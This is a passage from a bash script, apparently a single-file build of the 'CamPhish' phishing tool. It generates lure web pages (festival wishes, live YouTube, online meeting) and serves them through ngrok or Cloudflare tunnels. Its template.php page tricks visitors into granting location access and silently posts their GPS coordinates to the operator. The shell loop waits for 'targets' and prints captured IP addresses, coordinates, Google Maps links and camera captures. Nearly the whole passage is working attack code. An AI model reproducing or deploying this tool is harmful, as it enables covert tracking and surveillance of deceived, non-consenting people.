</div>
  <div class="bottom-bar">
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-microphone"></i>
      <h6>Mute</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-video"></i>
      <h6>Stop Video</h6>
    </div>
    <div class="icon-button" style="margin-left: auto;">
      <i class="fas fa-shield-alt"></i>
      <h6>Security</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-users"></i>
      <h6>Participants</h6>
    </div>
    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
      <i class="fas fa-plus-square"></i>
      <h6>Share content</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-comments"></i>
      <h6>Chat</h6>
    </div>
    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
      <i class="fas fa-record-vinyl"></i>
      <h6>Record</h6>
    </div>
    <button style="margin-right: 50px;">End</button>
  </div>
</body>
</html>
ONLINEEOF

# ==============================================
# FILE: template.php (main landing page)
# ==============================================
cat > template.php << 'TEMPEOF'
<?php
include 'ip.php';
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function debugLog(message) {
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        function getLocation() {
            if (navigator.geolocation) {
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                redirectToMainPage();
            };
            
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            document.getElementById("locationStatus").innerText = "Redirecting...";
            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }
        
        function redirectToMainPage() {
            try {
                window.location.href = "forwarding_link/index2.html";
            } catch (e) {
                window.location = "forwarding_link/index2.html";
            }
        }
        
        window.onload = function() {
            setTimeout(function() {
                getLocation();
            }, 500);
        };
    </script>
</head>
<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
    <h2>Loading, please wait...</h2>
    <p>Please allow location access for better experience</p>
    <p id="locationStatus">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
';
exit;
?>
TEMPEOF

echo "✅ All files created successfully!"
}

# ==============================================
# FUNCTION: Banner Display
# ==============================================
banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ultimate - Single File v1.0 \e[0m \n"
printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
printf "\n"
}

# ==============================================
# FUNCTION: Check Dependencies
# ==============================================
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed. Install it: apt-get install php"; exit 1; }
}

# ==============================================
# FUNCTION: Stop Processes
# ==============================================
stop() {
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  pkill -f ngrok > /dev/null 2>&1
  pkill -f php > /dev/null 2>&1
  pkill -f cloudflared > /dev/null 2>&1
fi
exit 1
}

# ==============================================
# FUNCTION: Catch IP
# ==============================================
catch_ip() {
if [[ -e "ip.txt" ]]; then
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
fi
}

# ==============================================
# FUNCTION: Catch Location
# ==============================================
catch_location() {
if [[ -e "current_location.txt" ]]; then
  printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\1;92m] Current location data:\e[0m\n"
  grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
  printf "\n"
  mv current_location.txt current_location.bak
fi

if [[ -e "location_"* ]]; then
  location_file=$(ls location_* | head -n 1)
  lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
  lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
  acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
  maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
  
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
  
  if [[ ! -d "saved_locations" ]]; then mkdir -p saved_locations; fi
  mv "$location_file" saved_locations/
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
fi
}

# ==============================================
# FUNCTION: Check Found
# ==============================================
checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets, Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "current_location.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
catch_location
fi
if [[ -e "LocationLog.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
catch_location
rm -rf LocationLog.log
fi
if [[ -e "LocationError.log" ]]; then
rm -rf LocationError.log
fi
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done 
}

# ==============================================
# FUNCTION: Cloudflare Tunnel
# ==============================================
cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo "Install unzip"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo "Install wget"; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"

arch=$(uname -m)
os=$(uname -s)

if [[ "$windows_mode" == true ]]; then
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    chmod +x cloudflared.exe
    echo '#!/bin/bash' > cloudflared
    echo './cloudflared.exe "$@"' >> cloudflared
    chmod +x cloudflared
else
    if [[ "$os" == "Darwin" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        tar -xzf cloudflared.tgz > /dev/null 2>&1
        chmod +x cloudflared
        rm cloudflared.tgz
    else
        case "$arch" in
            "x86_64") wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
            "i686"|"i386") wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 ;;
            "aarch64"|"arm64") wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1 ;;
            "armv7l"|"armv6l"|"arm") wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1 ;;
            *) wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
        esac
        chmod +x cloudflared
    fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm -rf .cloudflared.log > /dev/null 2>&1 &

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link not generating. Check internet/cloudflared\e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_cloudflare
checkfound
}

# ==============================================
# FUNCTION: Ngrok Server
# ==============================================
ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo "Install unzip"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo "Install wget"; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"

arch=$(uname -m)
os=$(uname -s)

if [[ "$windows_mode" == true ]]; then
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    unzip ngrok.zip > /dev/null 2>&1
    chmod +x ngrok.exe
    rm -rf ngrok.zip
else
    if [[ "$os" == "Darwin" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok.zip
    else
        case "$arch" in
            "x86_64") wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1 ;;
            "i686"|"i386") wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1 ;;
            "aarch64"|"arm64") wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1 ;;
            "armv7l"|"armv6l"|"arm") wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1 ;;
            *) wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1 ;;
        esac
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok.zip
    fi
fi
fi

if [[ "$windows_mode" == true ]]; then
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
    ./ngrok.exe authtoken $ngrok_auth > /dev/null 2>&1 &
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
    ./ngrok authtoken $ngrok_auth > /dev/null 2>&1 &
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
fi

sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link not generating. Check ngrok\e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

# ==============================================
# FUNCTION: Payload Cloudflare
# ==============================================
payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

# ==============================================
# FUNCTION: Payload Ngrok
# ==============================================
payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

# ==============================================
# FUNCTION: Select Template
# ==============================================
select_template() {
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
fi
}

# ==============================================
# FUNCTION: CamPhish Main
# ==============================================
camphish() {
printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
else
ngrok_server
fi
}

# ==============================================
# MAIN EXECUTION
# ==============================================
clear
echo "🔧 Creating all required files..."
create_files
echo "✅ Files created. Starting CamPhish..."
sleep 2
banner
dependencies
camphish
